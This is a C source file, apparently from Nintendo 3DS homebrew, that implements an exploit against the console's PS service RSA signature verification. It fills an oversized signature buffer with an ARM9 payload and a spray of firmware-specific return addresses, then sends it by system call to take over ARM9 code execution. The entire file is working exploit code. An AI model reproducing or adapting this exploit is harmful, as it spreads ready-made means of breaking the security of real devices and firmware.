#include <string.h>
#include <stdlib.h>

#include "rsa_exploit.h"
#include "../bins/arm9.h"
#include "../libctru/svc.h"
#include "../libctru/os.h"

void drawHex(u32 val, int x, int y);

Result PS_VerifyRsaSha256_Exploit(Handle *handle, u32 *linearbuf)
{
    Result ret = 0;
    u32 *cmdbuf = getThreadCommandBuffer();
    u32 bufSize, baseAddr;
    

    u32 fversion = (*(vu32*)0x1FF80000) & ~0xFF;
    //drawHex(fversion, 8, 120);
    switch(fversion)
    {
        case SYSTEM_VERSION(3, 32, 0): // v1 safe_mode firm, old3ds (latest since firmware 3.0.0-X) c0b0-bd64=34c
            bufSize = 0xD9B8+0x1000; 
            baseAddr = 0x080B9580;
            break;	
        case SYSTEM_VERSION(2, 27, 0): // 1.0
            bufSize = 0xD9B8; // (?)
            baseAddr = 0x080B95C0;
            break;
    }

    if(baseAddr == 0) return -1;

    u32* buffer = (u32 *)linearbuf + 0x1000; // linear heap
    memset(buffer, 0, bufSize);

    buffer[0x28/sizeof(u32)] = 0x820002;
    buffer[0x2C/sizeof(u32)] = (u32)(buffer + 0x80/sizeof(u32));
    buffer[0x30/sizeof(u32)] = (bufSize << 4) | 0xA;
    buffer[0x34/sizeof(u32)] = (u32)(buffer + 0x380/sizeof(u32));
    buffer[0x280/sizeof(u32)] = bufSize<<3; //RSA bit-size, for the signature.

    u32 *ptr = buffer+0x380/sizeof(u32);
    u32 size;
    const u32 *src = (const u32 *)getArm9Payload(&size);
    u32 nopsled = 0x0; // FIXME do we need such a  large NOP sled?

    for(u32 i = 0; i < nopsled/sizeof(u32); i++)
        *ptr++ = 0xE1A00000;

    memcpy(ptr, src, size);
    ptr += size/sizeof(u32);

    for(u32 i=0; i < bufSize-size-nopsled; i+=4) //bufsize-1908=bd64+1908
        *ptr++ = (u32*)baseAddr;

    memcpy(cmdbuf, buffer, 0x80);

    cmdbuf[0] = 0x00020244;

    if((ret = svcSendSyncRequest(*handle))!=0) return ret;

    //We do not expect to return from the syncRequest
    return (Result)cmdbuf[1];
}